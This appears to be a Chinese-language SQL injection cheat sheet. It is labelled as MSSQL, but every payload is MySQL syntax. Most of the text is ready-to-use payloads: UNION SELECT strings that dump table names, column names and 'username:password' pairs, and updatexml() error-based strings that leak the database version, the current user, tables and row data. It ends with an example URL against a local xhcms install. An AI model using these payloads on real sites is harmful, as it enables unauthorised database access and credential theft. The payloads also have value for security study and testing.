

[mssql注入指令 - vigarbuaa - 博客园 (cnblogs.com)](https://www.cnblogs.com/vigarbuaa/p/3371500.html)

爆表名

-1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() --+

爆列名

-1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' --+

爆字段

-1' union select 1,group_concat(username,":",password),3 from users --+

## 报错注入

### updatexml()函数

#### updataxml()函数用法

```mysql
UPDATEXML (XML_document, XPath_string, new_value);
```

第一个参数：XML_document是String格式，为XML文档对象的名称

第二个参数：XPath_string (Xpath格式的字符串) 

第三个参数：new_value，String格式，替换查找到的符合条件的数据

作用：改变文档中符合条件的节点

#### updatexml报错注入用法

##### 爆出数据库的版本信息

```mysql
and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
```

因为concat()是将其连接成一个字符串，不符合xpath_string格式，会出现格式错误而报错，并会爆出

##### 爆出连接用户

```mysql
and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)
```

##### 爆表

```mysql
and updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0)
```

```mysql
and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=数据库的十六进制表示 limit 0,1) ,0x7e),1)
```

```mysql
and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=0x7868 limit 0,1) ,0x7e),1)
```

##### 爆列名

```mysql
and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=0x7868 and table_name= 表的十六进制表示 limit 2,1),0x7e),1)
```

```mysql
and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=库的十六进制表示 and table_name=表的十六进制表示 limit 2,1),0x7e),1)
```

##### 查数据

```mysql
and updatexml(1,concat(0x7e,(select 列名 from 表名 limit 0,1),0x7e),1)
```

```mysql
and updatexml(1,concat(0x7e,(select 列名 from 表名 limit 0,1),0x7e),1)
```

##### 例子

```mysql
http://localhost/xhcms/index.php?r=content&cid=1 and updatexml(1,concat(0x7e,(select title from content limit 0,1),0x7e),1)
```